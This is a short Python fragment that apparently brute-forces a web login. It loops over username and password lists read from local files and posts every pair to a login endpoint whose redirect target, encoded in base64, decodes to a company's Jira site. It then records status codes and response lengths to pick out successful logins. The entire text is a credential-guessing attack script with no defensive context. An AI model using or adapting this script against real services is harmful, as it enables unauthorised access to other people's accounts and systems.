for admin in open(r'C:\..\name.txt'):    for line in open(r'C:\..\pass.txt'):        username = admin.strip()        password = line.strip()        payload = {            'username':username,'password':password,'back_target':'aHR0cHM6Ly9qaXJhLmRpZGFwaW5jaGUuY29tLw=='        }        Response = requests.post(url,params=payload,headers=header)        result = str(Response.status_code)+','+username+','\            +password +',' + str(len(Response.content))        f.write(result+'\n')
